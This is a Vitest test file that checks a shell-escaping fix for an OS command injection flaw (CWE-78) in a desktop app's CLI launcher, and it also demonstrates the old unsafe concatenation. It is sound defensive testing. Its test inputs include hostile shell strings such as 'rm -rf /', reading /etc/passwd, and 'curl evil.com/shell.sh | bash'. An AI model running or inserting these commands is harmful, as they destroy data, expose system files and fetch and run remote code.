import { describe, expect, it } from "vitest"

/**
 * CWE-78: OS Command Injection
 * File: packages/desktop-electron/src/main/cli.ts
 *
 * Tests that shellEscape properly neutralizes shell metacharacters,
 * preventing command injection when args are interpolated into shell commands.
 */

// Extract shellEscape logic (same implementation as in cli.ts)
function shellEscape(input: string) {
  if (!input) return "''"
  return `'${input.replace(/'/g, `'"'"'`)}'`
}

// Simulate buildCommand's shell line construction (Unix mode)
function buildShellLine(sidecar: string, args: string[]) {
  const escapedArgs = args.map(shellEscape).join(" ")
  return `"${sidecar}" ${escapedArgs}`
}

// Simulate the OLD vulnerable behavior (string concatenation, no escape)
function buildShellLineUnsafe(sidecar: string, args: string) {
  return `"${sidecar}" ${args}`
}

describe("CWE-78: OS Command Injection in cli.ts", () => {
  const sidecar = "/usr/local/bin/opencode"

  describe("shellEscape", () => {
    it("should wrap normal input in single quotes", () => {
      expect(shellEscape("hello")).toBe("'hello'")
    })

    it("should escape single quotes in input", () => {
      expect(shellEscape("it's")).toBe("'it'\"'\"'s'")
    })

    it("should return empty quoted string for empty input", () => {
      expect(shellEscape("")).toBe("''")
    })

    it("should neutralize semicolon injection", () => {
      const malicious = "; rm -rf /"
      const escaped = shellEscape(malicious)
      // Wrapped in single quotes — shell treats entire string as literal
      expect(escaped).toBe("'; rm -rf /'")
      // Must start and end with single quote to be safe
      expect(escaped.startsWith("'")).toBe(true)
      expect(escaped.endsWith("'")).toBe(true)
    })

    it("should neutralize $() command substitution", () => {
      const malicious = "$(whoami)"
      const escaped = shellEscape(malicious)
      expect(escaped).toBe("'$(whoami)'")
      // Inside single quotes, $() is literal, not executed
    })

    it("should neutralize backtick command substitution", () => {
      const malicious = "`id`"
      const escaped = shellEscape(malicious)
      expect(escaped).toBe("'`id`'")
    })

    it("should neutralize pipe injection", () => {
      const malicious = "| cat /etc/passwd"
      const escaped = shellEscape(malicious)
      expect(escaped).toBe("'| cat /etc/passwd'")
    })

    it("should neutralize && chaining", () => {
      const malicious = "&& curl evil.com/shell.sh | bash"
      const escaped = shellEscape(malicious)
      expect(escaped).toBe("'&& curl evil.com/shell.sh | bash'")
    })
  })

  describe("buildShellLine (fixed - array args with escape)", () => {
    it("should safely handle hostname with injection attempt", () => {
      const args = ["serve", "--hostname", "127.0.0.1; rm -rf /", "--port", "4096"]
      const line = buildShellLine(sidecar, args)
      // The malicious hostname is wrapped in single quotes, neutralized
      expect(line).toContain("'127.0.0.1; rm -rf /'")
      // Verify each arg is individually quoted — no bare unquoted semicolons
      const argsSection = line.slice(line.indexOf("'"))
      const unquoted = argsSection.replace(/'[^']*'/g, "QUOTED")
      expect(unquoted).not.toContain(";")
    })

    it("should safely handle args with $() substitution", () => {
      const args = ["serve", "--hostname", "$(curl evil.com)", "--port", "4096"]
      const line = buildShellLine(sidecar, args)
      expect(line).toContain("'$(curl evil.com)'")
    })

    it("should safely handle args with backtick substitution", () => {
      const args = ["serve", "--hostname", "`wget evil.com`", "--port", "4096"]
      const line = buildShellLine(sidecar, args)
      expect(line).toContain("'`wget evil.com`'")
    })

    it("should work correctly with normal args", () => {
      const args = ["--print-logs", "--log-level", "WARN", "serve", "--hostname", "localhost", "--port", "4096"]
      const line = buildShellLine(sidecar, args)
      expect(line).toBe(`"${sidecar}" '--print-logs' '--log-level' 'WARN' 'serve' '--hostname' 'localhost' '--port' '4096'`)
    })
  })

  describe("OLD vulnerable buildShellLine (string concat, no escape)", () => {
    it("DEMONSTRATES VULNERABILITY: injection via hostname", () => {
      const maliciousArgs = "serve --hostname 127.0.0.1; rm -rf / --port 4096"
      const line = buildShellLineUnsafe(sidecar, maliciousArgs)
      // The old code would produce a line where `; rm -rf /` is a separate command
      expect(line).toContain("; rm -rf /")
    })
  })
})
